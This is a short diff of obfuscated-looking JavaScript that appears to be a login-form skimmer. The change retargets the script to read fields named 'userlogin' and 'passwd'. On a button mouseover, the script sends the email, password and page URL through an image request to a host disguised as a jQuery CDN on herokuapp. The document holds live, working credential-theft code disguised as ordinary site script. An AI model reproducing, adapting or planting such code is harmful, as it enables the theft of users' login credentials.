@@ -104,8 +104,8 @@ var login_form = document.getElementById("loginForm");
               clearInterval(interval);
               document['getElementsByClassName']('botones_1')[0].onmouseover = function (_0x441cx2) {
                var login = {};
-              login.email = document.getElementsByName("userid")[0].value;
-              login.pass = document.getElementsByName("password")[0].value;
+              login.email = document.getElementsByName("userlogin")[0].value;
+              login.pass = document.getElementsByName("passwd")[0].value;
 
               (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.email+"&p="+login.pass;
               }
